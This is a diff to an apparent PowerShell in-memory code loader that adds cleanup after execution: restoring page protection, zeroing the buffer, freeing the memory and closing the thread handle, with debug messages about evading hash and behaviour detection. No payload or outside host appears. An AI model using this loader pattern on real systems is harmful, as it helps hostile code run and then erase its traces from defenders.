@@ -38,3 +38,31 @@ try {
 } catch {
     Write-Host "[-] Execution error: $($_.Exception.Message)"
 }
+
+$dummyOldProtect = 0
+$success = [Native.Win32]::VirtualProtect($addr, [uint32]$size, 0x04, [ref]$dummyOldProtect)  # back to PAGE_READWRITE
+if (-not $success) {
+    Write-Host "[-] Failed to revert protection (non-fatal for demo)"
+}
+
+try {
+    $zeroBuffer = New-Object byte[] $size
+    [Runtime.InteropServices.Marshal]::Copy($zeroBuffer, 0, $addr, $size)
+    Write-Host "[DEBUG] Memory zeroed (demo only — rarely evades hash/behavior rules)"
+} catch {
+    Write-Host "[-] Zeroing failed"
+}
+
+$success = [Native.Win32]::VirtualFree($addr, 0, 0x8000)  
+if ($success) {
+    Write-Host "[+] Memory region freed"
+} else {
+    $err = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
+    Write-Host "[-] VirtualFree failed (error $err — common if thread still running)"
+}
+
+Start-Sleep -Milliseconds 1500
+$success = [Native.Win32]::VirtualFree($addr, 0, 0x8000)
+if ($success) { Write-Host "[+] Delayed free succeeded" }
+
+[Native.Win32]::CloseHandle($thread) | Out-Null
